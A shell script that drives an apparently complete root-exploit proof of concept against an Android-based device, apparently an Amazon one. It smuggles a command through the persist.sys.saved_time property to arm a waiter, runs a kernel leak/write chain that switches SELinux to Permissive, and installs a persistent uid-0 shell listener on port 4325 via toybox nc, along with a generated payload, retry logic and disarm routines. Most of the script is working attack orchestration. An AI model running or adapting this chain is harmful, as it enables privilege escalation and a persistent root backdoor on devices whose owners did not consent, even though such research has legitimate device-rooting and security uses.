#!/bin/sh
set -eu

# Full proof-of-concept driver for the trona root flow (root.md).
#
# Phases:
#   staging  (once) -> arm the time_update waiter via the boot's one-shot
#   reboot   -> fresh boot consumes the phase-2 chain
#   root     -> carrier leak/write (SELinux Permissive) + waiter fires payload
#               -> uid-0 listener on 127.0.0.1:4325
#   disarm   -> optional revert (reinstall numeric saved_time via staging)
#
# Usage:
#   scripts/root_poc.sh [payload]          auto-stage if needed, then root
#   scripts/root_poc.sh disarm             revert persistence (numeric restore)
#   scripts/root_poc.sh status             report current device state
#
# Requirements: an authorized adb device. Host adb is preferred; the bundled
# XBPS build is used only when no host adb is available.

repo_dir="$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)"
adb_bin="${ADB:-$repo_dir/tools/adb-portable.sh}"

# Cross-version carrier selection (carriers.tsv is the single source of
# truth). Sourced early; resolved after the adb()/die() helpers below.
. "$repo_dir/scripts/version_env.sh"

payload_default="$repo_dir/scripts/rootsvc_payload.sh"
waiter_trigger='x[$(until [ "$(getenforce)" ];do sleep 1;done;toybox nc -s 127.0.0.1 -p 4325 -L sh&)]000'
. "$repo_dir/scripts/phase_b_status.sh"

generate_payload() {
  cat > "$payload_default" <<'PAYLOAD_EOF'
#!/system/bin/sh
echo "REROOT paydone uid=$(id -u) ctx=$(cat /proc/self/attr/current)"
log -t REROOT "paydone uid=$(id -u) ctx=$(cat /proc/self/attr/current)"
log -t ROOTSVC "start uid=$(id -u) ctx=$(cat /proc/self/attr/current)"
mkdir -p /data/local/tmp/rootsvc
chmod 0777 /data/local/tmp/rootsvc
toybox nc -s 127.0.0.1 -p 4325 -L /system/bin/sh -l 2>/dev/null &
svc_pid=$!
echo "$svc_pid" > /data/local/tmp/rootsvc/pid.txt
chmod 0644 /data/local/tmp/rootsvc/pid.txt
log -t ROOTSVC "listener pid=$svc_pid"
sleep 36000
PAYLOAD_EOF
  chmod 0755 "$payload_default"
}

adb() { timeout 30 "$adb_bin" "$@"; }
die() { echo "FATAL: $*" >&2; exit 1; }

# Resolve the carrier variant for this device's firmware (fails closed on
# unknown builds: the NULL-write address differs per firmware version).
version_env_resolve "$repo_dir" || die "carrier variant resolution failed"

check_device() {
  state="$(adb devices 2>&1 | awk '$2 == "device" {print $1}')"
  [ -n "$state" ] || die "no authorized device (adb devices <serial> device)"
  echo "device=$state"
  boot=""
  for i in $(seq 1 60); do
    boot="$(adb shell getprop sys.boot_completed 2>&1 | tr -d '\r')"
    [ "$boot" = 1 ] && break
    sleep 5
  done
  [ "$boot" = 1 ] || die "boot_completed never reached"
  echo "boot_completed=1"
  # PS7319: the zygote settings observer and Amazon's time service are not
  # settled right at boot_completed. Injecting too early silently loses the
  # one-shot (observed live: put fired at +9s and +45s, zygote never
  # observed it; the same put at +3min was observed and worked). A lost put
  # does NOT consume the one-shot, so the arming step retries. 120s settle
  # matches the observed working point on this heavily-loaded device.
  settle="${SNUSNU_BOOT_SETTLE:-120}"
  echo "settling ${settle}s (zygote observer + time service)"
  sleep "$settle"
}

armed_status() {
  saved_time="$(adb shell getprop persist.sys.saved_time 2>&1 | tr -d '\r')"
  waiter_state_for_value "$saved_time" "$waiter_trigger"
}

phase_status() {
  echo "enforce=$(adb shell getenforce 2>&1 | tr -d '\r')"
  echo "state=$(armed_status)"
  echo "root_probe=$(printf 'id -u\nexit\n' | adb shell 'toybox nc -w 2 127.0.0.1 4325' 2>/dev/null | tr -d '\r')"
  echo "exemptions=$(adb shell 'settings get global hidden_api_blacklist_exemptions' 2>&1 | tr -d '\r')"
}

phase_disarm() {
  echo "disarm: restore numeric saved_time + remove waiter (consumes this boot's one-shot)"
  old="$(adb shell 'cat /data/local/tmp/__reroot_old_time' 2>&1 | tr -d '\r')"
  case "$old" in ''|*[!0-9]*) die "restore snapshot missing: $old";; esac
  cmd="setprop persist.sys.saved_time $old; printf '%s' disarmed=; getprop persist.sys.saved_time;"
  adb shell < "$repo_dir/scripts/zygote_payload_system_app.sh" >/dev/null
  sleep 3
  { printf '%s\nexit\n' "$cmd"; } | adb shell 'toybox nc -w 10 127.0.0.1 4321' >/dev/null
  sleep 2
  verify="$(adb shell getprop persist.sys.saved_time 2>&1 | tr -d '\r')"
  echo "saved_time_now=$verify"
  [ "$verify" = "$old" ] || { echo "disarm FAILED (still non-numeric); re-run from a clean boot"; exit 1; }
  echo "disarm OK; reboot to clear in-memory Permissive if desired"
}

wait_60s_for_waiter() {
  # Waiter fires ~30s into a boot; on a fresh boot we landed within that window
  # so this is only a sanity wait when device was rebooted by us.
  true
}

prepare_retry_after_spent_primitive() {
  retry_number="$1"
  payload="$2"
  echo "stateful hwbinder primitive spent; rebooting before attempt $retry_number"
  adb reboot >/dev/null 2>&1 || true
  sleep 10
  adb wait-for-device || true
  check_device

  state="$(armed_status)"
  case "$state" in
    ARMED)
      echo "waiter remains armed on fresh boot"
      ;;
    NUMERIC*)
      echo "waiter trigger was consumed and normalized by time_update ($state)"
      echo "using this boot only to re-stage the waiter; Phase B needs a separate fresh boot"
      "$repo_dir/scripts/stage_reroot_waiter.sh" "$payload" \
        || die "waiter re-staging failed after spent hwbinder attempt"
      adb reboot >/dev/null 2>&1 || true
      sleep 10
      adb wait-for-device || true
      check_device
      # PS7319: after the reboot the trigger fires and the boot time-sync
      # normalizes the property, so ARMED is not the expected state here: 
      # the waiter being alive (time_update loop) is.
      retry_state="$(armed_status)"
      retry_svc="$(adb shell getprop init.svc.time_update 2>&1 | tr -d '\r')"
      if [ "$retry_state" = ARMED ] || [ "$retry_svc" = running ]; then
        echo "waiter ready for retry attempt $retry_number (state=$retry_state svc=$retry_svc)"
      else
        die "waiter was not armed or running for retry attempt $retry_number (state=$retry_state svc=$retry_svc)"
      fi
      ;;
    *)
      die "waiter state is neither armed nor safely numeric after reboot: $state"
      ;;
  esac
}

root_flow() {
  generate_payload
  payload="$([ "${1:-}" ] && echo "$1" || echo "$payload_default")"
  [ -f "$payload" ] || die "payload file not found: $payload"

  # Asset staging uses the webview app's uid channel and waiter arming uses a
  # uid-1000 channel - two DIFFERENT one-shot injections, so they cannot share
  # a boot. Stage assets first; if staging consumed this boot's one-shot,
  # reboot before arming.
  #
  # The staging listener does not survive reboots, but the staged assets do.
  # Once verified, record the fact host-side so later boots skip staging
  # entirely (re-verifying would need a fresh listener = burning the one-shot
  # that Phase B's carrier needs).
  #
  # The marker is CONTENT-keyed, not existence-keyed, and lives outside git.
  # Two defects made existence alone unsafe:
  #   * it was tracked, so a fresh clone already had it and skipped the staging
  #     that made the original device work -- Phase B then ran against assets
  #     that were never installed;
  #   * it recorded nothing about WHICH device, build or carrier was staged, so
  #     it survived a device swap, a cleared WebView data dir, an OTA, or a
  #     forced variant change, letting a carrier built for another kernel be
  #     reused.
  # Skipping is now conditional on all five identity fields matching.
  staged_marker="$repo_dir/.assets-staged.$SNU_VARIANT.sha256"
  staged_serial="$(adb get-serialno 2>/dev/null | tr -d '\r')"
  staged_identity="variant=$SNU_VARIANT carrier_sha=$SNU_CARRIER_SHA ps=$SNU_PS_TOKEN build=$SNU_BUILD_ID incremental=$SNU_FULL_BUILD_ID serial=$staged_serial"
  if [ -f "$staged_marker" ] && [ "$(cat "$staged_marker" 2>/dev/null)" = "$staged_identity" ]; then
    echo "assets already staged and verified for $(echo "$staged_identity" | cut -d' ' -f1,2,6) (marker $staged_marker); skipping staging"
  else
    if [ -f "$staged_marker" ]; then
      echo "marker present but does not match this device/build; restaging"
      printf '  marker : %s\n' "$(cat "$staged_marker" 2>/dev/null)"
      printf '  expected: %s\n' "$staged_identity"
    fi
    "$repo_dir/scripts/stage_initial_root_assets.sh" install || die "initial-root asset staging failed"
    if "$repo_dir/scripts/stage_initial_root_assets.sh" verify >/dev/null 2>&1; then
      printf '%s' "$staged_identity" > "$staged_marker"
    else
      die "staged assets failed on-device verification; not recording a marker"
    fi
  fi
  if [ -f "${SNU_STAGING_MARKER:-/tmp/snu_staging_consumed}" ]; then
    rm -f "${SNU_STAGING_MARKER:-/tmp/snu_staging_consumed}"
    echo "staging consumed this boot's one-shot; rebooting before arming"
    adb reboot >/dev/null 2>&1 || true
    sleep 10
    adb wait-for-device || true
    check_device
  fi

  if [ "$(armed_status)" != ARMED ]; then
    echo "** PHASE A: staging waiter (consumes this boot's one-shot) **"
    "$repo_dir/scripts/stage_reroot_waiter.sh" "$payload" \
      || die "staging failed"
    echo "staging complete; rebooting to a fresh boot"
    adb reboot >/dev/null 2>&1 || true
    sleep 10
    adb wait-for-device || true
    check_device
  else
    echo "waiter already ARMED; skipping staging"
  fi

  max_attempts="${SNUSNU_ROOT_ATTEMPTS:-6}"
  case "$max_attempts" in
    ''|*[!0-9]*|0) die "SNUSNU_ROOT_ATTEMPTS must be a positive integer" ;;
  esac
  attempt=1
  while :; do
    current_waiter_state="$(armed_status)"
    time_svc="$(adb shell getprop init.svc.time_update 2>&1 | tr -d '\r')"
    case "$current_waiter_state" in
      ARMED) : ;;
      *)
        # PS7319: the boot time-sync normalizes the property ~60s in, but the
        # trigger has already fired and time_update is blocked in the
        # getenforce loop: that IS the armed state for Phase B purposes.
        if [ "$time_svc" = "running" ]; then
          echo "waiter FIRED-AND-WAITING (property normalized; time_update loop alive)"
        else
          die "Phase B cannot start: time_update waiter is neither armed nor running ($current_waiter_state; svc=$time_svc); re-stage it on a dedicated staging boot"
        fi
        ;;
    esac
    echo "** PHASE B: root chain attempt $attempt/$max_attempts (carrier leak+write -> Permissive -> uid-0 waiter handoff) **"
    if "$repo_dir/scripts/reroot_after_boot.sh" "$payload"; then
      break
    else
      phase_b_result=$?
    fi
    action="$(phase_b_retry_action "$phase_b_result")"
    if [ "$action" != RETRY_FRESH_BOOT ]; then
      case "$phase_b_result" in
        "$PHASE_B_PRECHECK") class="pre-exploit validation/configuration" ;;
        "$PHASE_B_CARRIER_START") class="carrier start" ;;
        "$PHASE_B_VALIDATION") class="carrier validation/configuration" ;;
        "$PHASE_B_WAITER_STATE") class="waiter state" ;;
        "$PHASE_B_POST_WRITE") class="post-write" ;;
        *) class="unknown" ;;
      esac
      die "Phase B aborted after $class failure (exit=$phase_b_result); automatic reboot would not make this deterministic failure safe"
    fi
    [ "$attempt" -lt "$max_attempts" ] \
      || die "stateful hwbinder attempt failed after $max_attempts fresh-boot attempts"
    attempt=$((attempt + 1))
    prepare_retry_after_spent_primitive "$attempt" "$payload"
  done

  echo
  echo "persistence_state=$(armed_status)"
  case "$(armed_status)" in
    ARMED)
      echo "Persistent-root waiter stays armed; every fresh boot re-installs"
      echo "the uid-0 listener on 127.0.0.1:4325 within ~30s of boot."
      echo "Use: printf 'id\nexit\n' | adb shell 'toybox nc -w 3 127.0.0.1 4325'"
      ;;
    NUMERIC*)
      echo "time_update waiter is disarmed for the next boot; re-rooting"
      echo "requires re-staging the waiter and a reboot (root_poc.sh <payload>)."
      ;;
  esac
}

case "${1:-root}" in
  status)  phase_status ;;
  disarm)  check_device; phase_disarm ;;
  root)    check_device; root_flow "${2:-}" ;;
  *)       die "unknown subcommand: $1 (root|status|disarm)" ;;
esac
